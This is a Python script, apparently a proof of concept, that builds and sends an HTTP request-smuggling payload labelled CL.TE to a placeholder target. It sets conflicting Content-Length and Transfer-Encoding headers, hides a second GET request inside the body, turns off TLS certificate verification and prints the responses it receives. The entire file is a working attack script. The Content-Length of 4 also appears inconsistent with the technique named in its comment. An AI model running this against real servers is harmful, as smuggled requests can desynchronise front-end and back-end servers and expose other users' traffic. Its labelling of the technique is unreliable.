import socket
import ssl

host = "TARGET_HOST_HERE"
port = 443

# CL.TE Smuggling: Front-end honors Content-Length, back-end honors Transfer-Encoding: chunked
smuggled_request = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n\r\n"
    "GET /robots.txt HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

second_request = (
    "GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

context = ssl._create_unverified_context()

with socket.create_connection((host, port)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        print("[+] Sending smuggled and follow-up request...")
        ssock.sendall(smuggled_request.encode())
        ssock.sendall(second_request.encode())

        ssock.settimeout(2)
        response_data = b""
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
        except socket.timeout:
            pass

        full_response = response_data.decode(errors="ignore")
        parts = full_response.split("HTTP/1.1 ")
        for idx, part in enumerate(parts[1:], start=1):
            print(f"\n[+] Response #{idx}")
            print("HTTP/1.1 " + part[:400])  # show first 400 chars of each response
